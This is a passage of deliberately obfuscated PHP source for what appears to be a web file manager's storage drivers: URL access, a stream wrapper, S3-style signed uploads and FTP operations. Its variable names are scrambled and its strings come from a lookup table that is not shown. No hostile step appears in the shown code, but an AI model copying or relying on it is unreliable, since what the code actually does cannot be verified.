$ˆÆµóì²; $™æÆ–’­[] = $µ˜É”œ—[1485] . $¨Á¾êÚø; } $É¼Å˜ô = !empty($™æÆ–’­) ? $µ˜É”œ—[73] . implode($µ˜É”œ—[279], $™æÆ–’­) : $µ˜É”œ—[12]; return $this->getHost() . $µ˜É”œ—[8] . $óû¸ŠæŸ . $É¼Å˜ô; } public function fileOut($½Ì‚ï±˜, $—Šñà¬ş = false, $ÑòàÜ¥ = false, $±ô¢¿ó = '') { if ($this->isFileOutServer()) { return $this->fileOutServer($½Ì‚ï±˜, $—Šñà¬ş, $ÑòàÜ¥, $±ô¢¿ó); } if (!$ÑòàÜ¥) { $ÑòàÜ¥ = $this->pathThis($½Ì‚ï±˜); } $Œ÷Ó«› = $—Šñà¬ş ? array($_SERVER[Ãìšã«™][1486] . rawurlencode($ÑòàÜ¥)) : array(); $õçæ˜ûü = $this->link($½Ì‚ï±˜, $Œ÷Ó«›); $this->fileOutLink($õçæ˜ûü); } public function fileOutServer($º©¹İÍ, $ò½ Şòè = false, $¤°¿şî = false, $ÏÚ£Ôáõ = '') { parent::fileOut($º©¹İÍ, $ò½ Şòè, $¤°¿şî, $ÏÚ£Ôáõ); } public function fileOutImage($âÈÎ¢½Ú, $¥ßı™Æ = 250) { $ëêâò„— = $this->link($âÈÎ¢½Ú . $_SERVER[Ãìšã«™][1487] . $¥ßı™Æ); $this->fileOutLink($ëêâò„—); } public function fileOutImageServer($Ì¥ñÜôù, $á…Ÿİº = 250) { parent::fileOutImage($Ì¥ñÜôù, $á…Ÿİº); } public function hashMd5($ŒíÂ¶æ‘) { $‘—ß‰Š =& $_SERVER[Ãìšã«™]; $Œ¼Ûı¼Ä = $this->_objectMeta($ŒíÂ¶æ‘); return isset($Œ¼Ûı¼Ä[$‘—ß‰Š[207]]) ? $Œ¼Ûı¼Ä[$‘—ß‰Š[207]] : !1; } public function size($û¿Š±¢¹) { $²µòı‚Ç = $this->objectMeta($û¿Š±¢¹); return $²µòı‚Ç ? $²µòı‚Ç[$_SERVER[Ãìšã«™][80]] : 0; } public function info($ÇÃß´ËÔ) { if ($this->isFolder($ÇÃß´ËÔ)) { return $this->folderInfo($ÇÃß´ËÔ); } else { if ($this->isFile($ÇÃß´ËÔ)) { return $this->fileInfo($ÇÃß´ËÔ); } } return !1; } public function exist($ĞÎ¸¸õ·) { return $this->isFile($ĞÎ¸¸õ·) || $this->isFolder($ĞÎ¸¸õ·); } public function isFile($È˜äç¼) { return !$this->isFolder($È˜äç¼) && $this->objectMeta($È˜äç¼); } public function isFolder($½œòòñä) { return $this->cacheMethod($_SERVER[Ãìšã«™][198], $½œòòñä); } protected function objectMeta($ĞÕí‡¹–) { return $this->cacheMethod($_SERVER[Ãìšã«™][199], $ĞÕí‡¹–); } protected function _objectMeta($Ø™²ÉŠì) { $üùä¬€» =& $_SERVER[Ãìšã«™]; if ($Ø™²ÉŠì == $üùä¬€»[12] || $Ø™²ÉŠì == $üùä¬€»[8]) { return array(); } $Ëùîá = $this->ussRequest($Ø™²ÉŠì, $üùä¬€»[1488]); if (!$Ëùîá[$üùä¬€»[1185]]) { return null; } $”™ôŠ³É = isset($Ëùîá[$üùä¬€»[1187]]) ? $Ëùîá[$üùä¬€»[1187]] : array(); if (!isset($”™ôŠ³É[$üùä¬€»[1489]])) { return null; } $ÈŒ°·¶İ = array($üùä¬€»[33] => isset($”™ôŠ³É[$üùä¬€»[1489]]) ? $”™ôŠ³É[$üùä¬€»[1489]] : null, $üùä¬€»[80] => isset($”™ôŠ³É[$üùä¬€»[1490]]) ? $”™ôŠ³É[$üùä¬€»[1490]] : null, $üùä¬€»[207] => isset($”™ôŠ³É[$üùä¬€»[1491]]) ? $”™ôŠ³É[$üùä¬€»[1491]] : null, $üùä¬€»[1458] => isset($”™ôŠ³É[$üùä¬€»[1492]]) ? $”™ôŠ³É[$üùä¬€»[1492]] : null); $ÈŒ°·¶İ[$üùä¬€»[1459]] = isset($”™ôŠ³É[$üùä¬€»[1493]]) ? strtotime($”™ôŠ³É[$üùä¬€»[1493]]) : $ÈŒ°·¶İ[$üùä¬€»[1458]]; return $ÈŒ°·¶İ; } protected function _isFolder($í¤€ì‰) { $‡´ˆ¬¥ß =& $_SERVER[Ãìšã«™]; if ($í¤€ì‰ == $‡´ˆ¬¥ß[12] || $í¤€ì‰ == $‡´ˆ¬¥ß[8]) { return !0; } $Ïåïˆ«â = $this->_objectMeta($í¤€ì‰); return isset($Ïåïˆ«â[$‡´ˆ¬¥ß[33]]) && $Ïåïˆ«â[$‡´ˆ¬¥ß[33]] == $‡´ˆ¬¥ß[79] ? !0 : !1; } } class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($ô…¸‘åœ = false) { } public function exist($Ò ™Ôû¨) { $»ó‚Íü– = $this->info($Ò ™Ôû¨); return $»ó‚Íü–[$_SERVER[Ãìšã«™][194]]; } public function isFile($¦Æ¬¼©) { $Š¿‰ä•û = $this->info($¦Æ¬¼©); return $Š¿‰ä•û[$_SERVER[Ãìšã«™][194]]; } public function isFolder($ÎªèÅÓÊ) { return !1; } public function size($Ü§ç¾€ú) { $¾ñ¨½¹Ñ = $this->info($Ü§ç¾€ú); return $¾ñ¨½¹Ñ[$_SERVER[Ãìšã«™][80]]; } public function info($á‰‡›Èø) { return $this->infoParse($á‰‡›Èø); } public function infoAuth($×“Šá´²) { return $this->infoParse($×“Šá´²); } public function infoWithChildren($¡ş¶æˆ…) { return $this->infoParse($¡ş¶æˆ…); } public function infoFull($¢Ä§İ¿–) { return $this->infoParse($¢Ä§İ¿–); } private function infoParse($ÁåÅòË) { $ç‡¼Ş’ =& $_SERVER[Ãìšã«™]; $Á†éôáæ = $this->header($ÁåÅòË); if (!$Á†éôáæ || !$Á†éôáæ[$ç‡¼Ş’[751]]) { return !1; } $×åêÌıÉ = _get($Á†éôáæ, $ç‡¼Ş’[332], 0); $âŞ¨ãà = array($ç‡¼Ş’[32] => $Á†éôáæ[$ç‡¼Ş’[32]], $ç‡¼Ş’[78] => $ÁåÅòË, $ç‡¼Ş’[33] => $ç‡¼Ş’[192], $ç‡¼Ş’[80] => intval($×åêÌıÉ), $ç‡¼Ş’[167] => get_path_ext($Á†éôáæ[$ç‡¼Ş’[32]]), $ç‡¼Ş’[1372] => $×åêÌıÉ > 0 && $Á†éôáæ[$ç‡¼Ş’[1494]], $ç‡¼Ş’[1373] => !1); return $âŞ¨ãà; } private function header($Âàà‰Ã) { $í³ÕÂÛû =& $_SERVER[Ãìšã«™]; if (isset(self::$_cacheHeader[$Âàà‰Ã])) { return self::$_cacheHeader[$Âàà‰Ã]; } $”‚èôçŠ = isset($GLOBALS[$í³ÕÂÛû[1495]]) ? $GLOBALS[$í³ÕÂÛû[1495]] : !1; $GLOBALS[$í³ÕÂÛû[1495]] = !0; self::$_cacheHeader[$Âàà‰Ã] = url_header($Âàà‰Ã); $GLOBALS[$í³ÕÂÛû[1495]] = $”‚èôçŠ; return self::$_cacheHeader[$Âàà‰Ã]; } public function hashSimple($‚»ç¸Î, $ŞĞ‡…ŒÓ = false) { $¹§ë¼Š =& $_SERVER[Ãìšã«™]; $Ç¶Çóêå = $this->info($‚»ç¸Î); if (!$Ç¶Çóêå || !$Ç¶Çóêå[$¹§ë¼Š[194]]) { return !1; } $úö‰¢ô = $Ç¶Çóêå[$¹§ë¼Š[80]]; $Å¼áöú = 200; $óŸÁ¸™Ì = 50; if ($úö‰¢ô <= $Å¼áöú * $óŸÁ¸™Ì) { return md5($this->fileSubstr($‚»ç¸Î, 0, $úö‰¢ô)) . $úö‰¢ô; } $÷¬³íÌÈ = intval($úö‰¢ô / $óŸÁ¸™Ì); $Â±Ò£ ® = $¹§ë¼Š[12]; $éçû = timeFloat(); $¶Ú˜œÀé = 15; for ($ÔñûĞà = 0; $ÔñûĞà < $óŸÁ¸™Ì; $ÔñûĞà++) { if (timeFloat() - $éçû > $¶Ú˜œÀé) { return !1; } $•Ò²­‰Â = $this->fileSubstr($‚»ç¸Î, $÷¬³íÌÈ * $ÔñûĞà, $Å¼áöú); if (!$•Ò²­‰Â) { return !1; } $Â±Ò£ ® .= $•Ò²­‰Â; } $Â±Ò£ ® .= $this->fileSubstr($‚»ç¸Î, $úö‰¢ô - $Å¼áöú, $Å¼áöú); return md5($Â±Ò£ ®) . $úö‰¢ô; } public function getContent($¢ãØ…) { return $this->fileSubstr($¢ãØ…); } public function fileSubstr($í«ìÄı˜, $á±‡¼™ê = 0, $ôêä¦ÔÚ = -1) { $•ö»¿¬ä =& $_SERVER[Ãìšã«™]; $¿æÙ«òª = $this->info($í«ìÄı˜); if (!$¿æÙ«òª || !$¿æÙ«òª[$•ö»¿¬ä[194]] && $¿æÙ«òª[$•ö»¿¬ä[80]] > 1024 * 1024 * 10) { return !1; } if ($ôêä¦ÔÚ === -1) { $ôêä¦ÔÚ = $¿æÙ«òª[$•ö»¿¬ä[80]]; } if ($ôêä¦ÔÚ == 0) { return $•ö»¿¬ä[12]; } $ªˆİÌ½¤ = array($•ö»¿¬ä[1496] . $á±‡¼™ê . $•ö»¿¬ä[783] . ($á±‡¼™ê + $ôêä¦ÔÚ - 1)); $«ÎÄÍšş = url_request($í«ìÄı˜, $•ö»¿¬ä[225], !1, $ªˆİÌ½¤, !1, !1, 1); return $«ÎÄÍšş[$•ö»¿¬ä[1187]] ? $«ÎÄÍšş[$•ö»¿¬ä[1187]] : $•ö»¿¬ä[12]; } public function download($†ª•á¹õ, $éßÌ°‰) { Downloader::start($†ª•á¹õ, $éßÌ°‰); return $éßÌ°‰; } } class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_fopenCache = array(); static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($ú†½…èÍ, $ºƒ²•ğ = '') { $this->info = $this->info($ú†½…èÍ); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[Ãìšã«™][78]]; $this->pathOpen = $ú†½…èÍ; if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } if (!isset(self::$_chunkBuffer[$ú†½…èÍ])) { self::$_chunkBuffer[$ú†½…èÍ] = array(); } self::$_fopenCache[$this->pathOpen] = $this; return $this->info ? !0 : !1; } function stream_read($›ÍÏÃ÷Ğ) { $…ÍÜ‘ÙÏ = $this->fileSubstr($this->pose, $›ÍÏÃ÷Ğ); $this->pose += strlen($…ÍÜ‘ÙÏ); return $…ÍÜ‘ÙÏ; } public function stream_tell() { return $this->pose; } public function stream_seek($ˆ³óßÚ…, $Òİñè™ˆ) { $ã®¢ú˜ı =& $_SERVER[Ãìšã«™]; if ($Òİñè™ˆ == SEEK_SET) { $this->pose = $ˆ³óßÚ…; } else { if ($Òİñè™ˆ == SEEK_CUR) { $this->pose += $ˆ³óßÚ…; } else { if ($Òİñè™ˆ == SEEK_END) { $this->pose = $this->info[$ã®¢ú˜ı[80]] + intval($ˆ³óßÚ…); } } } if ($ˆ³óßÚ… < 0) { $this->pose = $this->info[$ã®¢ú˜ı[80]] + $ˆ³óßÚ…; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[Ãìšã«™][80]]; } public function stream_close() { unset(self::$_fopenCache[$this->pathOpen]); return !0; } public function url_stat($Şë’É±Ü, $ßá†·İ) { $×ıÚÑ° =& $_SERVER[Ãìšã«™]; $ˆ¦½¹°Ã = $this->info($Şë’É±Ü); return array($×ıÚÑ°[1497] => 0, $×ıÚÑ°[1498] => 0, $×ıÚÑ°[16] => 32768 + 511, $×ıÚÑ°[1499] => 0, $×ıÚÑ°[1500] => 0, $×ıÚÑ°[1501] => 0, $×ıÚÑ°[1502] => 0, $×ıÚÑ°[80] => $ˆ¦½¹°Ã[$×ıÚÑ°[80]], $×ıÚÑ°[1503] => $ˆ¦½¹°Ã[$×ıÚÑ°[1371]], $×ıÚÑ°[1459] => $ˆ¦½¹°Ã[$×ıÚÑ°[86]], $×ıÚÑ°[1458] => $ˆ¦½¹°Ã[$×ıÚÑ°[193]], $×ıÚÑ°[1504] => 0, $×ıÚÑ°[1505] => 0); } static $fileInfo = array(); public function info($Ş±ÁÖ÷Å) { $­¾·„„ = $_SERVER[Ãìšã«™][1506]; if (isset(self::$fileInfo[$Ş±ÁÖ÷Å])) { return self::$fileInfo[$Ş±ÁÖ÷Å]; } if (substr($Ş±ÁÖ÷Å, 0, strlen($­¾·„„)) != $­¾·„„) { return !1; } self::$fileInfo[$Ş±ÁÖ÷Å] = IO::info(substr($Ş±ÁÖ÷Å, strlen($­¾·„„))); return self::$fileInfo[$Ş±ÁÖ÷Å]; } public static function read($Şë›‚š®, $–×Š¬¦Æ, $Î†»©“ñ) { if (!isset(self::$_fopenCache[$Şë›‚š®])) { $¿ûêŒÛÁ = new StreamWrapperIO(); $¿ûêŒÛÁ->stream_open($Şë›‚š®); self::$_fopenCache[$Şë›‚š®] = $¿ûêŒÛÁ; } $¿ûêŒÛÁ = self::$_fopenCache[$Şë›‚š®]; return $¿ûêŒÛÁ->fileSubstr($–×Š¬¦Æ, $Î†»©“ñ); } public static function _read($öòã·, $àãŸûì÷, $Ğ€×Ç€ß) { $Ù¢ü¾¤ï =& $_SERVER[Ãìšã«™]; $Ëòçşèõ = fopen($öòã·, $Ù¢ü¾¤ï[1375]); if (!$Ëòçşèõ) { return $Ù¢ü¾¤ï[12]; } $Ã˜ÌàÔÄ = 8192; fseek($Ëòçşèõ, $àãŸûì÷, SEEK_SET); $Õ¤‡ğÃæ = $Ù¢ü¾¤ï[12]; $ãÍ”²“Å = 0; while ($ãÍ”²“Å < $Ğ€×Ç€ß) { $šÎÓ ø = min($Ã˜ÌàÔÄ, $Ğ€×Ç€ß - $ãÍ”²“Å); $Õ¤‡ğÃæ .= fread($Ëòçşèõ, $šÎÓ ø); $ãÍ”²“Å += $šÎÓ ø; } fclose($Ëòçşèõ); return $Õ¤‡ğÃæ; } public function fileSubstr($”áÂğß©, $¥ç•ÉÀ„) { $Ş•×Š• =& $_SERVER[Ãìšã«™]; $•Şšûğ¤ = $this->info[$Ş•×Š•[80]]; $›÷µüÇ¹ = $”áÂğß©; $³£òúñ = $¥ç•ÉÀ„; if ($”áÂğß© < 0) { $”áÂğß© = $•Şšûğ¤ + $”áÂğß©; } if ($¥ç•ÉÀ„ === !1) { $¥ç•ÉÀ„ = $•Şšûğ¤ - $”áÂğß©; } if ($”áÂğß© + $¥ç•ÉÀ„ > $•Şšûğ¤) { $¥ç•ÉÀ„ = $•Şšûğ¤ - $”áÂğß©; } if ($¥ç•ÉÀ„ <= 0) { return $Ş•×Š•[12]; } if ($”áÂğß© < 0 || $”áÂğß© >= $•Şšûğ¤ || $¥ç•ÉÀ„ <= 0 || $¥ç•ÉÀ„ > 1024 * 1024 * 10) { throw new Exception("\151\x6f\x46\151\154\x65\122\x65\141\x64\x20\145\162\x72\157\x72\x21\40\x73\164\x61\162\x74\75{$”áÂğß©}\73\x6c\x65\x6e\147\164\150\x3d{$¥ç•ÉÀ„}\73\40\163\x69\172\145\x3d{$•Şšûğ¤}\x3b"); } $©î­Œ¡œ = 64 * 1024; $¾ù§ØùÔ =& self::$_chunkBuffer[$this->path]; if (!$¾ù§ØùÔ) { $¾ù§ØùÔ = array(); } $··âŞÀÔ = 0; $§›ò”­ = 0; $Ù±ÓÂÃŞ = $Ş•×Š•[12]; foreach ($¾ù§ØùÔ as $··âŞÀÔ => $Ù±ÓÂÃŞ) { $··âŞÀÔ = intval($··âŞÀÔ); $§›ò”­ = $··âŞÀÔ + strlen($Ù±ÓÂÃŞ); if ($”áÂğß© >= $§›ò”­) { continue; } if ($”áÂğß© >= $··âŞÀÔ && $”áÂğß© + $¥ç•ÉÀ„ <= $§›ò”­) { return substr($Ù±ÓÂÃŞ, $”áÂğß© - $··âŞÀÔ, $¥ç•ÉÀ„); } break; } if (count($¾ù§ØùÔ) > 100 || timeFloat() - $this->timeStart > 2.0) { $this->log($Ş•×Š•[1507], $Ş•×Š•[1508] . count($¾ù§ØùÔ) . "\x3b\x73\164\141\x72\x74\x3d{$”áÂğß©}\x2c\154\x65\156\147\164\150\75{$¥ç•ÉÀ„}\x3b\x70\157\x73\145\72{$··âŞÀÔ}\176{$§›ò”­}"); throw new Exception($Ş•×Š•[1509]); } $÷ŸÚÂ¯È = intval($”áÂğß© / $©î­Œ¡œ) * $©î­Œ¡œ; $¨Óœ½ Ê = ceil(($”áÂğß© + $¥ç•ÉÀ„) / $©î­Œ¡œ) * $©î­Œ¡œ - $÷ŸÚÂ¯È; $ï¡¡ëˆŒ = IO::fileSubstr($this->path, $÷ŸÚÂ¯È, $¨Óœ½ Ê); $¾ù§ØùÔ[$÷ŸÚÂ¯È . $Ş•×Š•[12]] = $ï¡¡ëˆŒ; ksort($¾ù§ØùÔ); $ßõŸîîè = substr($ï¡¡ëˆŒ, $”áÂğß© - $÷ŸÚÂ¯È, $¥ç•ÉÀ„); return $ßõŸîîè; } private function log($·Şû¨Ó, $ìÙâš£) { $€Íª‰¹‚ =& $_SERVER[Ãìšã«™]; $ÂíËÁñ = timeFloat() - $this->timeStart; write_log(sprintf($€Íª‰¹‚[1510], $·Şû¨Ó, $this->info[$€Íª‰¹‚[32]], $ÂíËÁñ, $ìÙâš£), $€Íª‰¹‚[1177]); } } goto CÖ§ó½æ²; F¥œÜÊä–ä: class PathDriverEDS extends PathDriverMinIO { public function __construct($ùø°Ú’) { parent::__construct($ùø°Ú’); } } class PathDriverEOS extends PathDriverBaseS3 { public function __construct($Ğ¼ÑÚÏ) { parent::__construct($Ğ¼ÑÚÏ); $this->signatureVersion($_SERVER[Ãìšã«™][211]); } public function uploadFormData($–ÈÌŒı, $ŸïåÉ±á = 3600) { $ÈİÍÊ‡º =& $_SERVER[Ãìšã«™]; $—’ã¡ÒÇ = $ÈİÍÊ‡º[191]; $¥™¾ëÀ¥ = $ÈİÍÊ‡º[1340]; $€ÌŸåğ = $ÈİÍÊ‡º[62]; $ùÅ¤Ü = gmdate($ÈİÍÊ‡º[1341]); $©¿‰ñõ® = gmdate($ÈİÍÊ‡º[752]); $„“ø›ü = $ÈİÍÊ‡º[1342]; $Ö²ÚòÍ = $ŸïåÉ±á . $ÈİÍÊ‡º[12]; $ìîâÃûÓ = $ÈİÍÊ‡º[1304]; $ê‚ä¾È“ = array($this->accessKey, $©¿‰ñõ®, $this->region, $€ÌŸåğ, $„“ø›ü); $áì¿¸ÚË = implode($ÈİÍÊ‡º[8], $ê‚ä¾È“); $´½àü”² = array($ÈİÍÊ‡º[1306] => gmdate($ÈİÍÊ‡º[1305], strtotime($ÈİÍÊ‡º[1343])), $ÈİÍÊ‡º[1307] => array(array($ÈİÍÊ‡º[1309] => $this->bucket), array($ÈİÍÊ‡º[1308] => $—’ã¡ÒÇ), array($ÈİÍÊ‡º[1310], $ÈİÍÊ‡º[1311], $ÈİÍÊ‡º[12]), array($ÈİÍÊ‡º[1310], $ÈİÍÊ‡º[1344], $ÈİÍÊ‡º[12]), array($ÈİÍÊ‡º[1310], $ÈİÍÊ‡º[1345], $ÈİÍÊ‡º[12]), array($ÈİÍÊ‡º[1312] => $ìîâÃûÓ), array($ÈİÍÊ‡º[1346] => $áì¿¸ÚË), array($ÈİÍÊ‡º[1347] => $¥™¾ëÀ¥), array($ÈİÍÊ‡º[1348] => $ùÅ¤Ü), array($ÈİÍÊ‡º[1349] => $Ö²ÚòÍ))); $¸§ÆÉ¡ù = base64_encode(json_encode($´½àü”²)); $İÕë—èÀ = hash_hmac($ÈİÍÊ‡º[1350], $©¿‰ñõ®, $ÈİÍÊ‡º[1351] . $this->secret, !0); $•ÖÔÒµÎ = hash_hmac($ÈİÍÊ‡º[1350], $this->region, $İÕë—èÀ, !0); $¦Ë¸ê˜Û = hash_hmac($ÈİÍÊ‡º[1350], $€ÌŸåğ, $•ÖÔÒµÎ, !0); $»‘„¶ëÔ = hash_hmac($ÈİÍÊ‡º[1350], $„“ø›ü, $¦Ë¸ê˜Û, !0); $â›¨ãÔÃ = hash_hmac($ÈİÍÊ‡º[1350], $¸§ÆÉ¡ù, $»‘„¶ëÔ); $´æåÜìØ = array($ÈİÍÊ‡º[210] => $ÈİÍÊ‡º[12], $ÈİÍÊ‡º[1352] => $ÈİÍÊ‡º[12], $ÈİÍÊ‡º[1308] => $—’ã¡ÒÇ, $ÈİÍÊ‡º[1312] => $ìîâÃûÓ, $ÈİÍÊ‡º[1316] => $¸§ÆÉ¡ù, $ÈİÍÊ‡º[1353] => $áì¿¸ÚË, $ÈİÍÊ‡º[1354] => $¥™¾ëÀ¥, $ÈİÍÊ‡º[1355] => $ùÅ¤Ü, $ÈİÍÊ‡º[1356] => $Ö²ÚòÍ, $ÈİÍÊ‡º[1357] => $â›¨ãÔÃ, $ÈİÍÊ‡º[174] => $this->getHost()); return $´æåÜìØ; } } class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = false; private $pasv = "\61"; private $config = array(); public function __construct($èøı˜çª) { parent::__construct(); if (count($èøı˜çª) > 0) { $this->_init($èøı˜çª); } } public function __destruct() { if (!$this->_isconn()) { return !1; } return @ftp_close($this->connect); } private function charsetReset($Ú¦¡ÈÀÉ) { $É”Îİ½Å =& $_SERVER[Ãìšã«™]; global $config; $this->appCharset = $config[$É”Îİ½Å[1358]]; $this->systemCharset = $config[$É”Îİ½Å[1359]]; if (isset($Ú¦¡ÈÀÉ[$É”Îİ½Å[1360]]) && $Ú¦¡ÈÀÉ[$É”Îİ½Å[1360]]) { $this->systemCharset = $Ú¦¡ÈÀÉ[$É”Îİ½Å[1360]]; } } public function iconvApp($¨‰ªá€¶) { return $this->iconvTo($¨‰ªá€¶, $this->systemCharset, $this->appCharset); } public function iconvSystem($¨ÖŞ¡ïæ) { return $this->iconvTo($¨ÖŞ¡ïæ, $this->appCharset, $this->systemCharset); } public function getPathOuter($¦Š°†ß) { $ô¦ÀÆú± =& $_SERVER[Ãìšã«™]; $áŞñ«úó = $this->iconvApp($this->pathBase); $¦Š°†ß = $this->iconvApp($¦Š°†ß); if (substr($áŞñ«úó, 0, 2) == $ô¦ÀÆú±[1361]) { $áŞñ«úó = BASIC_PATH . substr($áŞñ«úó, 2); } if (substr($¦Š°†ß, 0, 2) == $ô¦ÀÆú±[1361]) { $¦Š°†ß = BASIC_PATH . substr($¦Š°†ß, 2); } $áŞñ«úó = KodIO::clear($áŞñ«úó); $¦Š°†ß = KodIO::clear($¦Š°†ß); $¦Š°†ß = substr($¦Š°†ß, strlen($áŞñ«úó)); if (empty($this->pathDriver)) { return $¦Š°†ß; } return $this->pathDriver . $ô¦ÀÆú±[8] . ltrim($¦Š°†ß, $ô¦ÀÆú±[8]); } private function _init($ì°Ç“ = array()) { $¨Óœ…×ó =& $_SERVER[Ãìšã«™]; if (!function_exists($¨Óœ…×ó[1362])) { throw new Exception(LNG($¨Óœ…×ó[1363])); } $this->config = $ì°Ç“; $this->charsetReset($ì°Ç“); foreach ($ì°Ç“ as $¹İ™Ñ©‚ => $²ã®àëğ) { if (isset($this->{$¹İ™Ñ©‚})) { $this->{$¹İ™Ñ©‚} = $²ã®àëğ; } } return $this->_login($ì°Ç“); } private function _login($Ó‹•‘½½) { $»òîâªÉ =& $_SERVER[Ãìšã«™]; static $ş¯âÊ€ü = array(); $­©´ïœŸ = md5(json_encode($Ó‹•‘½½)); if (isset($ş¯âÊ€ü[$­©´ïœŸ])) { foreach ($ş¯âÊ€ü[$­©´ïœŸ] as $ÈÒË…¦  => $›ïšˆâƒ) { $this->{$ÈÒË…¦ } = $›ïšˆâƒ; } return !0; } $ú«™ş›• = parse_url(trim($this->server, $»òîâªÉ[8])); $this->host = $ú«™ş›•[$»òîâªÉ[174]]; $¼ì©—ñ× = isset($ú«™ş›•[$»òîâªÉ[173]]) && $ú«™ş›•[$»òîâªÉ[173]] == $»òîâªÉ[1364] ? !0 : !1; $this->scheme = $¼ì©—ñ× ? $»òîâªÉ[1365] : $»òîâªÉ[1366]; $this->port = isset($ú«™ş›•[$»òîâªÉ[175]]) ? $ú«™ş›•[$»òîâªÉ[175]] : 21; $this->connect = @ftp_connect($this->host, $this->port, 5); if ($this->connect === !1) { return !1; } $…×ØÅó× = @ftp_login($this->connect, $this->username, $this->userpass); @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); $§Ÿ…¼­ = $this->pasv == $»òîâªÉ[89] ? !0 : !1; @ftp_pasv($this->connect, $§Ÿ…¼­); $ş¯âÊ€ü[$­©´ïœŸ] = array($»òîâªÉ[1367] => $this->connect, $»òîâªÉ[174] => $this->host, $»òîâªÉ[173] => $this->scheme, $»òîâªÉ[175] => $this->port); return $…×ØÅó×; } private function _isconn() { if (is_resource($this->connect)) { return !0; } return $this->_login($this->config); } public function mkfile($ßöŠìúÅ, $ô‘ÈÔÉ = '', $˜Ÿñ³ªî = REPEAT_RENAME) { if ($this->setContent($ßöŠìúÅ, $ô‘ÈÔÉ)) { return $this->getPathOuter($ßöŠìúÅ); } return !1; } public function mkdir($íÀß«¨Ñ, $—¸°§Ï˜ = REPEAT_SKIP) { if (!$this->_isconn()) { return !1; } $íÀß«¨Ñ = $this->iconvSystem($íÀß«¨Ñ); if ($this->_isFolder($íÀß«¨Ñ) || @ftp_mkdir($this->connect, $íÀß«¨Ñ)) { return $this->getPathOuter($íÀß«¨Ñ); } if (!$this->mkdir($this->pathFather($íÀß«¨Ñ))) { return !1; } if ($íÀß«¨Ñ = @ftp_mkdir($this->connect, $íÀß«¨Ñ)) { return $this->getPathOuter($íÀß«¨Ñ); } return !1; } public function copyFile($†å››², $’ìú´˜¯) { if (!$this->_isconn()) { return !1; } $××‰ñé¦ = $this->pathThis($this->iconvSystem($†å››²)); $¬”²€¶ù = $this->tempFile($××‰ñé¦); $¿ÊÁÚÛ = $this->iconvApp($¬”²€¶ù); $this->download($†å››², $¿ÊÁÚÛ); $»ŠŞ†²« = $this->upload($’ìú´˜¯, $¿ÊÁÚÛ); $this->tempFileRemve($¬”²€¶ù); return $»ŠŞ†²«; } public function moveFile($éú¾øœâ, $Ø¤ÊËÎğ) { if (!$this->_isconn()) { return !1; } $éú¾øœâ = $this->iconvSystem($éú¾øœâ); $Ø¤ÊËÎğ = $this->iconvSystem($Ø¤ÊËÎğ); $ŠÌûé¹û = @ftp_rename($this->connect, $éú¾øœâ, $Ø¤ÊËÎğ); return $ŠÌûé¹û ? $this->getPathOuter($Ø¤ÊËÎğ) : !1; } public function delFile($óÏÓõô´) { if (!$this->_isconn()) { return !1; } $óÏÓõô´ = $this->iconvSystem($óÏÓõô´); return @ftp_delete($this->connect, $óÏÓõô´); } public function delFolder($¶ÑÃÆ¯ò) { if (!$this->_isconn()) { return !1; } $this->listItemCache = !1; $‚ÅÚÉ¼« = $¾³¶ÎıŞ = array(); $this->fileList($¶ÑÃÆ¯ò, $‚ÅÚÉ¼«, $¾³¶ÎıŞ, !0); $this->listItemCache = !0; foreach ($¾³¶ÎıŞ as $Ç¡¸êÑ) { $¨ÏÕú´ş = $this->iconvSystem($Ç¡¸êÑ[$_SERVER[Ãìšã«™][32]]); $³¼•ÂğÂ = @ftp_delete($this->connect, $¨ÏÕú´ş); if (!$³¼•ÂğÂ) { return !1; } } foreach ($‚ÅÚÉ¼« as $¨ÏÕú´ş) { $¨ÏÕú´ş = $this->iconvSystem($¨ÏÕú´ş); $³¼•ÂğÂ = @ftp_rmdir($this->connect, $¨ÏÕú´ş); if (!$³¼•ÂğÂ) { return !1; } } $¶ÑÃÆ¯ò = $this->iconvSystem($¶ÑÃÆ¯ò); return @ftp_rmdir($this->connect, $¶ÑÃÆ¯ò); } public function rename($·°§–¾ï, $°‘«ÁÉ) { $«­¼ÄÒº =& $_SERVER[Ãìšã«™]; if (!$this->_isconn()) { return !1; } $óùõ„‰× = $this->fileNameAuto($this->pathFather($·°§–¾ï), $°‘«ÁÉ); $óùõ„‰× = $this->iconvSystem($óùõ„‰×); $·°§–¾ï = $this->iconvSystem($·°§–¾ï); $ŠˆÌãÏà = $this->pathFather($·°§–¾ï); $©âîşğÈ = rtrim($ŠˆÌãÏà, $«­¼ÄÒº[8]) . $«­¼ÄÒº[8] . $óùõ„‰×; $ª·İ½šå = @ftp_rename($this->connect, $·°§–¾ï, $©âîşğÈ); $©âîşğÈ = $this->iconvApp($©âîşğÈ); return $ª·İ½šå ? $this->getPathOuter($©âîşğÈ) : !1; } private function folderInfo($²ÓöÖÈÚ, $¾ø¢Ïñ = false) { $–üËƒ‹š =& $_SERVER[Ãìšã«™]; $Ìî±ı… = array($–üËƒ‹š[32] => $this->pathThis($²ÓöÖÈÚ), $–üËƒ‹š[78] => $this->getPathOuter($–üËƒ‹š[8] . $²ÓöÖÈÚ), $–üËƒ‹š[33] => $–üËƒ‹š[79]); if ($¾ø¢Ïñ) { return $Ìî±ı…; } $Ìî±ı…[$–üËƒ‹š[193]] = $Ìî±ı…[$–üËƒ‹š[86]] = 0; $Ìî±ı…[$–üËƒ‹š[194]] = $Ìî±ı…[$–üËƒ‹š[195]] = !0; return $Ìî±ı…; } private function fileInfo($ïŞ÷ïÖ, $÷·ÆÅÖš = false, $‚”©†âà = array()) { $ëã— ©© =& $_SERVER[Ãìšã«™]; $üúàÁ‰Ù = array($ëã— ©©[32] => $this->pathThis($ïŞ÷ïÖ), $ëã— ©©[78] => $this->getPathOuter($ëã— ©©[8] . $ïŞ÷ïÖ), $ëã— ©©[33] => $ëã— ©©[192], $ëã— ©©[80] => isset($‚”©†âà[$ëã— ©©[80]]) ? $‚”©†âà[$ëã— ©©[80]] : 0, $ëã— ©©[167] => $this->ext($ïŞ÷ïÖ)); if 